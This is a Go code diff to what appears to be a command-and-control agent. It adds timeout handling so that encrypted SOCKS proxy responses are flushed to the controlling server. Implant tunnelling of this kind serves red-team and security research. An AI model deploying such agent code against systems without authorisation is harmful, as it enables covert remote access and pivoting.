@@ -10,8 +10,10 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"net"
 	"os"
 	"os/signal"
+	"strings"
 	"syscall"
 	"time"
 )
@@ -172,11 +174,20 @@ func handleConnection(conn *StreamConn, config map[string]string) {
 		return
 	}
 
-	// Main message loop
+	// Main message loop — use a short read timeout when SOCKS sessions are
+	// active so pending responses get flushed even without incoming commands.
 	for {
-		// Read message from HTTPS agent
+		if hasPendingSocksResponses() {
+			conn.ReadTimeout = 500 * time.Millisecond
+		} else {
+			conn.ReadTimeout = 0
+		}
 		rawMessage, err := conn.ReadMessage()
 		if err != nil {
+			if isTimeoutError(err) {
+				flushPendingSocksResponses(conn)
+				continue
+			}
 			return
 		}
 
@@ -379,6 +390,36 @@ func handleServerData(conn *StreamConn, encryptedPayload string) {
 		}
 		secureComms.rotateSecret()
 	}
+}
+
+func isTimeoutError(err error) bool {
+	if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+		return true
+	}
+	return strings.Contains(err.Error(), "timeout")
+}
+
+func flushPendingSocksResponses(conn *StreamConn) {
+	responses := GetSocksHTTPResponses()
+	if len(responses) == 0 || secureComms == nil {
+		return
+	}
+	payload := map[string]interface{}{
+		secVal(protoKeyAgentId): clientID,
+		secVal(protoKeySr):      responses,
+	}
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		return
+	}
+	encrypted, err := secureComms.encryptMessage(string(jsonData))
+	if err != nil {
+		return
+	}
+	if err := sendTCPResponse(conn, encrypted); err != nil {
+		return
+	}
+	secureComms.rotateSecret()
 }
 
 // sendTCPResponse sends a response through the TCP connection
